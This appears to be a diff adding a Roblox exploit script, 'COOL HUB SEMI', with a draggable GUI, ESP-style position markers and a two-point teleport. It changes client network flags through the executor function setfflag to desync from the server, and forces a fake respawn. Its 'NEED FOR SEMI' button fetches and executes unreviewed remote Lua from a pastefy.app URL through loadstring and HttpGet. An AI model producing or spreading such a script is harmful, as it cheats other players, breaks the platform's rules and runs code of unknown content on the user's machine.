@@ -1,0 +1,340 @@
+-- SERVICES
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local UserInputService = game:GetService("UserInputService")
+
+local LocalPlayer = Players.LocalPlayer
+
+-- CONFIG
+local STAND_POSITION = Vector3.new(-335.364, -5.093, 103.374)
+local POS2_POSITION = Vector3.new(-353.364, -5.093, 80.374)
+local STAND_SIZE = Vector3.new(2, 3, 2)
+
+local teleportEnabled = false
+local keybind = nil
+
+-- DESYNC FUNCTIONS
+local FFlags = {
+    GameNetPVHeaderRotationalVelocityZeroCutoffExponent = -5000,
+    LargeReplicatorWrite5 = true,
+    LargeReplicatorEnabled9 = true,
+    AngularVelociryLimit = 360,
+}
+
+local defaultFFlags = {
+    GameNetPVHeaderRotationalVelocityZeroCutoffExponent = 8,
+    LargeReplicatorWrite5 = false,
+    LargeReplicatorEnabled9 = false,
+    AngularVelociryLimit = 180,
+}
+
+local desyncActive = false
+local firstActivation = true
+
+local function applyFFlags(flags)
+    for name, value in pairs(flags) do
+        pcall(function()
+            setfflag(tostring(name), tostring(value))
+        end)
+    end
+end
+
+local function respawn(plr)
+    local char = plr.Character
+    if char then
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if hum then
+            hum:ChangeState(Enum.HumanoidStateType.Dead) -- Simulate death
+        end
+        char:ClearAllChildren() -- Clear existing character model
+        task.wait(0.5) -- Wait for a moment
+        local newChar = Instance.new("Model") -- Create a new character model
+        newChar.Parent = Workspace
+        plr.Character = newChar
+        task.wait() -- Wait again
+        plr.Character = char -- Restore the character
+        newChar:Destroy() -- Clean up
+    end
+end
+
+-- STAND ESP
+local function createStand()
+    if Workspace:FindFirstChild("StandHereESP") then
+        Workspace.StandHereESP:Destroy()
+    end
+
+    -- First Position Marker
+    local stand = Instance.new("Part")
+    stand.Name = "StandHereESP"
+    stand.Size = STAND_SIZE
+    stand.Anchored = true
+    stand.CanCollide = false
+    stand.Transparency = 1
+    stand.Position = STAND_POSITION
+    stand.Parent = Workspace
+
+    local box = Instance.new("BoxHandleAdornment")
+    box.Adornee = stand
+    box.Size = STAND_SIZE
+    box.AlwaysOnTop = true
+    box.ZIndex = 10
+    box.Color3 = Color3.fromRGB(255, 182, 193) -- Light pink
+    box.Transparency = 0.15
+    box.Parent = stand
+
+    local billboard = Instance.new("BillboardGui")
+    billboard.Size = UDim2.new(0, 220, 0, 40)
+    billboard.StudsOffset = Vector3.new(0, STAND_SIZE.Y / 2 + 0.8, 0)
+    billboard.AlwaysOnTop = true
+    billboard.Parent = stand
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.fromScale(1, 1)
+    label.BackgroundTransparency = 1
+    label.Text = "TP HERE"
+    label.Font = Enum.Font.LuckiestGuy
+    label.TextColor3 = Color3.new(1, 1, 1)
+    label.TextStrokeColor3 = Color3.fromRGB(173, 216, 230)
+    label.TextStrokeTransparency = 0.5
+    label.TextSize = 16
+    label.TextScaled = true
+    label.Parent = billboard
+
+    -- Second Position Marker
+    local pos2Stand = Instance.new("Part")
+    pos2Stand.Name = "Pos2ESP"
+    pos2Stand.Size = STAND_SIZE
+    pos2Stand.Anchored = true
+    pos2Stand.CanCollide = false
+    pos2Stand.Transparency = 1
+    pos2Stand.Position = POS2_POSITION
+    pos2Stand.Parent = Workspace
+
+    local pos2Box = Instance.new("BoxHandleAdornment")
+    pos2Box.Adornee = pos2Stand
+    pos2Box.Size = STAND_SIZE
+    pos2Box.AlwaysOnTop = true
+    pos2Box.ZIndex = 10
+    pos2Box.Color3 = Color3.fromRGB(255, 0, 0) -- Red color
+    pos2Box.Transparency = 0.15
+    pos2Box.Parent = pos2Stand
+
+    local pos2Billboard = Instance.new("BillboardGui")
+    pos2Billboard.Size = UDim2.new(0, 220, 0, 40)
+    pos2Billboard.StudsOffset = Vector3.new(0, STAND_SIZE.Y / 2 + 0.5, 0)
+    pos2Billboard.AlwaysOnTop = true
+    pos2Billboard.Parent = pos2Stand
+
+    local pos2Label = Instance.new("TextLabel")
+    pos2Label.Size = UDim2.fromScale(1, 1)
+    pos2Label.BackgroundTransparency = 1
+    pos2Label.Text = "STAND HERE"
+    pos2Label.Font = Enum.Font.LuckiestGuy
+    pos2Label.TextColor3 = Color3.new(1, 1, 1)
+    pos2Label.TextStrokeColor3 = Color3.new(255 / 255, 0 / 255, 0 / 255)
+    pos2Label.TextStrokeTransparency = 0.5
+    pos2Label.TextSize = 16
+    pos2Label.TextScaled = true
+    pos2Label.Position = UDim2.new(0, 0, 0.7, 0) -- Positioned lower
+    pos2Label.Parent = pos2Billboard
+end
+
+-- TELEPORT LOGIC
+local function teleportToStand()
+    if not teleportEnabled then return end
+    if not LocalPlayer.Character then return end
+
+    local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if hrp then
+        hrp.CFrame = CFrame.new(STAND_POSITION + Vector3.new(0, 2, 0)) -- Teleport to pos1
+        wait(0.5) -- Wait to allow for pos2 teleport
+        hrp.CFrame = CFrame.new(POS2_POSITION + Vector3.new(0, 2, 0)) -- Teleport to pos2
+    end
+end
+
+-- GUI
+local gui = Instance.new("ScreenGui")
+gui.Name = "COOLHUBSEMI"
+gui.ResetOnSpawn = false
+gui.Parent = game.CoreGui
+
+-- Main Frame
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(0, 160, 0, 220)
+frame.Position = UDim2.new(1, -170, 0.5, -110)
+frame.BackgroundColor3 = Color3.fromRGB(255, 182, 193) -- Light pink
+frame.BorderSizePixel = 0
+
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
+
+-- DRAGGING FUNCTIONALITY
+local dragging = false
+local dragInput
+local dragStart
+local startPos
+
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        local delta = input.Position - dragStart
+        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+-- Header
+local header = Instance.new("Frame", frame)
+header.Size = UDim2.new(1, 0, 0, 40)
+header.BackgroundColor3 = Color3.fromRGB(255, 182, 193) -- Light pink
+Instance.new("UICorner", header).CornerRadius = UDim.new(0, 8)
+local title = Instance.new("TextLabel", header)
+title.Size = UDim2.new(1, -20, 1, 0)
+title.Position = UDim2.new(0, 10, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "COOL HUB"
+title.Font = Enum.Font.LuckiestGuy
+title.TextColor3 = Color3.new(1, 1, 1)
+title.TextStrokeColor3 = Color3.new(1, 1, 1) -- White stroke
+title.TextStrokeTransparency = 0.5
+title.TextSize = 24
+title.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Status
+local statusLabel = Instance.new("TextLabel", frame)
+statusLabel.Size = UDim2.new(1, -20, 0, 20)
+statusLabel.Position = UDim2.new(0, 10, 0, 80)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Text = "Status: OFF"
+statusLabel.Font = Enum.Font.LuckiestGuy
+statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+statusLabel.TextSize = 19
+statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Toggle Button
+local toggleBtn = Instance.new("TextButton", frame)
+toggleBtn.Size = UDim2.new(1, -20, 0, 40)
+toggleBtn.Position = UDim2.new(0, 10, 0, 110)
+toggleBtn.Text = "ENABLE TELEPORT"
+toggleBtn.Font = Enum.Font.LuckiestGuy
+toggleBtn.TextColor3 = Color3.fromRGB(255, 182, 193)
+toggleBtn.TextSize = 14
+toggleBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White background
+Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 6)
+
+toggleBtn.MouseButton1Click:Connect(function()
+    teleportEnabled = not teleportEnabled
+
+    if teleportEnabled then
+        toggleBtn.Text = "DISABLE TELEPORT"
+        toggleBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+        statusLabel.Text = "Status: Enabled"
+        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+        teleportToStand()
+    else
+        toggleBtn.Text = "ENABLE TELEPORT"
+        toggleBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White background
+        statusLabel.Text = "Status: Disabled"
+        statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+    end
+end)
+
+-- Keybind Button
+local keybindBtn = Instance.new("TextButton", frame)
+keybindBtn.Size = UDim2.new(1, -20, 0, 40)
+keybindBtn.Position = UDim2.new(0, 10, 0, 160)
+keybindBtn.Text = "SET KEYBIND: NONE"
+keybindBtn.Font = Enum.Font.LuckiestGuy
+keybindBtn.TextColor3 = Color3.fromRGB(255, 182, 193)
+keybindBtn.TextSize = 14
+keybindBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White background
+Instance.new("UICorner", keybindBtn).CornerRadius = UDim.new(0, 6)
+
+keybindBtn.MouseButton1Click:Connect(function()
+    keybindBtn.Text = "PRESS A KEY..."
+    keybindBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+
+    local conn
+    conn = UserInputService.InputBegan:Connect(function(input, gp)
+        if gp then return end
+        if input.UserInputType == Enum.UserInputType.Keyboard then
+            keybind = input.KeyCode
+            keybindBtn.Text = "KEYBIND: " .. keybind.Name
+            keybindBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White background
+            conn:Disconnect()
+        end
+    end)
+end)
+
+-- NEED FOR SEMI BUTTON
+local needForSemiBtn = Instance.new("TextButton", frame)
+needForSemiBtn.Size = UDim2.new(1, -20, 0, 40)
+needForSemiBtn.Position = UDim2.new(0, 10, 0, 40)
+needForSemiBtn.Text = "NEED FOR SEMI"
+needForSemiBtn.Font = Enum.Font.LuckiestGuy
+needForSemiBtn.TextColor3 = Color3.fromRGB(255, 182, 193)
+needForSemiBtn.TextSize = 10
+needForSemiBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White background
+Instance.new("UICorner", needForSemiBtn).CornerRadius = UDim.new(0, 6)
+
+local function onNeedForSemiEnabled()
+    print("Need for Semi is now ENABLED.")
+    
+    -- Execute loadstring command
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://pastefy.app/50dzG2ld/raw"))()
+    end)
+
+    if not success then
+        warn("Failed to execute script: " .. err)
+    end
+end
+
+needForSemiBtn.MouseButton1Click:Connect(function()
+    desyncActive = not desyncActive -- Toggle desync state
+    if desyncActive then
+        applyFFlags(FFlags) -- Apply desync flags
+        if firstActivation then
+            respawn(LocalPlayer) -- Respawn player on first activation
+            firstActivation = false
+        end
+        needForSemiBtn.Text = "YAN EH ON MO PARA GUMANA" -- Update button text
+        needForSemiBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0) -- Change color
+        onNeedForSemiEnabled() -- Execute function on enabling
+    else
+        applyFFlags(defaultFFlags) -- Revert to default flags
+        needForSemiBtn.Text = "OFF GAGO WAG MO GAMITIN" -- Update button text
+        needForSemiBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White color
+    end
+end)
+
+-- OTHER LOGIC...
+
+-- INIT
+LocalPlayer.CharacterAdded:Connect(function()
+    task.wait(0.5)
+    createStand()
+end)
+
+if LocalPlayer.Character then
+    createStand()
+end
+
+print("[COOLHUB SEMI] loaded successfully.")
